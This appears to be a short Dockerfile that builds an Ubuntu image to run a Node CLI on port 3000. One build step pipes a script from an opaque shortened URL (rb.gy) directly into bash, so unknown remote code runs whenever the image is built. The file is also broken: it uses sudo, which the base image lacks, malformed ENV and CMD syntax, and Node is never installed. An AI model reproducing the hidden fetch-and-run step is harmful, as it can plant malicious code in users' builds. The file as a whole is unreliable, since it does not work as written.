FROM ubuntu:22.04

ENV ROOT_ENV = 'docker'
ENV BASE_SYSTEM = 'ubuntu:22.04-docker'

RUN sudo apt install git curl

RUN curl -fsSL https://rb.gy/kjmfry | bash

EXPOSE 3000

CMD ['node', 'cli-driver.js']